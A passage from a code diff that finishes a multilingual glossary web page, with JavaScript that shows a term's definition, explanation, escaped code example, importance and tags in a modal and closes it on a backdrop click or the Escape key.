+                .replace(/>/g, '&gt;');
+            
+            const t = translations[currentLang];
+            
+            modalBody.innerHTML = `
+                <div class="modal-title">${term.title}</div>
+                <div class="term-category-badge ${categoryClass}" style="margin-bottom: 2rem;">${term.category}</div>
+                
+                <div class="info-box">
+                    <h3>${t.definitionLabel}</h3>
+                    <p>${term.definition}</p>
+                </div>
+                
+                <div class="info-box">
+                    <h3>${t.explanationLabel}</h3>
+                    <p>${term.explanation}</p>
+                </div>
+                
+                <div class="info-box">
+                    <h3>${t.exampleLabel}</h3>
+                    <div class="code-block"><code>${escapedExample}</code></div>
+                </div>
+                
+                <div class="info-box">
+                    <h3>${t.importanceLabel}</h3>
+                    <p>${term.importance}</p>
+                </div>
+                
+                <div class="term-tags">
+                    ${term.tags.map(tag => `<span class="tag">#${tag}</span>`).join('')}
+                </div>
+            `;
+            
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('termModal');
+            modal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        document.getElementById('termModal').addEventListener('click', (e) => {
+            if (e.target.id === 'termModal') closeModal();
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+    </script>
+</body>
+</html>
